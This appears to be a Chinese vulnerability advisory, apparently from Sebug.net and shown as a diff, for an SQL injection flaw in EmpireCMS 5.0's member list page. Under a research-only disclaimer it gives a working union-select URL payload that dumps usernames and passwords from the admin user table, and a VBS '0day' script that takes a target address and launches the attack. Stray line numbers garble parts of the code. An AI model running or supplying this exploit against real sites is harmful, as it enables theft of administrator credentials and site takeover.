@@ -1,0 +1,6 @@
+帝国CMS5.0“/e/member/list/index.php”文件注射漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1./e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9'+union+select+1,1,1,concat(char2.(123),userid,char(95),username,char(95),password,char(125))+from+phome_enewsuser3. 4./*5. 6.VBS利用程序7.代码如下:8. 9.DIM a,i,e,b,ie,cmd510.i=InputBox ("输入目标地址 格式http://www.phome.net","帝国CMS 0DAY利用程序 BY Nuke")11.If i="" Then12.msgbox "请输入地址"13.WScript.Quit14.End If15.b=InputBox ("输入表名默认为phome_enewsuser","帝国CMS 0DAY利用程序 BY Nuke","phome_enewsuser")16.If b="" Then17.msgbox "请输入表名"18.WScript.Quit19.End If20.e = "/e/member/list/index.php?sear=1&totalnum=1&keyboard=%D9'+union+select+1,1,1,concat(char(123),userid,char(95),username,char(95),password,char(125))+from+" & b & "/*"21.ie = i & e22.Set a=WScript.CreateObject("InternetExplorer.Application")23.a.visible=True24.a.navigate ie
